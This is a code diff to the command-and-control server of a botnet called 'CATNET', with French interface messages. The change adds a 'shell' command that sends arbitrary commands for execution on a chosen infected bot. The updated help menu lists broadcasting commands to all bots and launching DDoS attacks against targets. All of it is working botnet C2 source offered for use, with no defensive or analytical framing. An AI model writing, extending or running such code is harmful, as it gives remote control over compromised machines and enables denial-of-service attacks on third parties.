@@ -181,7 +181,8 @@ class BotnetC2:
   ███    █▄    ███    ███     ███       ███    ███ ███    ███ 
   ███    ███   ███    ███     ███       ███    ███ ███    ███ 
   ▀████████    ███    █▀     ▄████▀      ▀██████▀   ▀██████▀  
-{Colors.MAGENTA}          >> CATNET BOTNET C2 INTERFACE v3.1 <<{Colors.END}
+{Colors.MAGENTA}          >> CATNET BOTNET C2 INTERFACE v3.2 <<{Colors.END}
+{Colors.WHITE}   [+] Admin Panel : Connected | WiFi-Optimized : YES{Colors.END}
         """
         return banner
 
@@ -189,13 +190,33 @@ class BotnetC2:
         action = cmd[0].lower()
         if action == "list":
             with self.lock:
+                if not self.connected_bots:
+                    out.write(f"{Colors.RED}[!] Aucun bot connecté.{Colors.END}\n")
+                    return
                 out.write(f"\r\n{Colors.BOLD}{'ID':<5} | {'IP':<15} | {'Hostname':<20} | {'Arch':<10}{Colors.END}\n")
                 out.write(f"{Colors.BLUE}" + "-" * 60 + f"{Colors.END}\n")
                 for i, b in enumerate(self.connected_bots):
                     out.write(f"{i:<5} | {b['ip']:<15} | {b['hostname']:<20} | {b['arch']:<10}\n")
+        
+        elif action == "shell" and len(cmd) > 2:
+            # shell <id> <command>
+            try:
+                bot_id = int(cmd[1])
+                command = " ".join(cmd[2:])
+                with self.lock:
+                    if bot_id < len(self.connected_bots):
+                        bot = self.connected_bots[bot_id]
+                        bot['socket'].send(f"EXEC {command}".encode())
+                        out.write(f"{Colors.GREEN}[+] Commande envoyée au bot {bot_id}.{Colors.END}\n")
+                    else:
+                        out.write(f"{Colors.RED}[!] ID de bot invalide.{Colors.END}\n")
+            except:
+                out.write(f"{Colors.RED}[!] Usage: shell <id> <command>{Colors.END}\n")
+
         elif action == "broadcast" and len(cmd) > 1:
             n = self.broadcast("EXEC " + " ".join(cmd[1:]))
             out.write(f"{Colors.GREEN}[+] Commande envoyée à {n} bots.{Colors.END}\n")
+            
         elif action == "ddos-all" and len(cmd) > 2:
             target = cmd[1]
             duration = cmd[2]
@@ -232,8 +253,9 @@ class BotnetC2:
         elif action == "help":
             out.write(f"\r\n{Colors.BOLD}Commandes disponibles :{Colors.END}\n")
             out.write(f" - {Colors.YELLOW}list{Colors.END}             : Affiche les bots connectés\n")
-            out.write(f" - {Colors.YELLOW}broadcast <cmd>{Colors.END}  : Exécute une commande shell\n")
-            out.write(f" - {Colors.YELLOW}ddos-all <t> <d> <m>{Colors.END}: Lance une attaque DDoS\n")
+            out.write(f" - {Colors.YELLOW}shell <id> <cmd>{Colors.END} : Exécute une commande sur un bot spécifique\n")
+            out.write(f" - {Colors.YELLOW}broadcast <cmd>{Colors.END}  : Exécute une commande sur TOUS les bots\n")
+            out.write(f" - {Colors.YELLOW}ddos-all <t> <d> <m>{Colors.END}: Lance une attaque DDoS générale\n")
             out.write(f" - {Colors.YELLOW}methods{Colors.END}          : Liste les types d'attaques\n")
             out.write(f" - {Colors.YELLOW}scans{Colors.END}            : Active/Désactive le monitoring des scans\n")
             out.write(f" - {Colors.YELLOW}status{Colors.END}           : Affiche les stats globales\n")
